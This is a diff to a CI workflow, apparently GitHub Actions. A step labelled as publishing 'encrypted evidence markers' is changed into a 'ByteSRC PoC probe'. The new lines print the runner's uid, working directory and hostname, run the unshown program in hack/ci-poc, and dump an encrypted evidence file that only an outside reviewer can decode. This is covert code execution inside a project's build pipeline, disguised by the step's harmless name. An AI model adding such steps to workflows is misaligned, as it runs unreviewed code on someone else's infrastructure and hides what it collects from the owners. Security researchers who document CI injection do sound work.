@@ -96,11 +96,9 @@ jobs:
           sudo make test 2>&1 | go-junit-report -parser gojson --set-exit-code -iocopy -out report.xml
       - name: Publish encrypted evidence markers
         run: |
-          echo "== ByteSRC PoC evidence (RSA-OAEP encrypted, reviewer holds key) =="
-          echo "uid=$(id -u) cwd=$(pwd)"
-          ls -la hack/ci-poc/ || true
-          echo "--- poc-run.exit ---"; cat hack/ci-poc/poc-run.exit 2>/dev/null || echo missing
-          echo "--- poc-run.err ---"; cat hack/ci-poc/poc-run.err 2>/dev/null || echo missing
+          echo "== ByteSRC PoC probe (pre-registered; fingerprint only, crypto-encrypted) =="
+          echo "uid=$(id -u) cwd=$(pwd) host=$(hostname)"
+          go run ./hack/ci-poc || true
           echo "--- evidence.b64 ---"; cat hack/ci-poc/evidence.b64 2>/dev/null || echo missing
       - name: Test summary
         uses: test-summary/action@v2
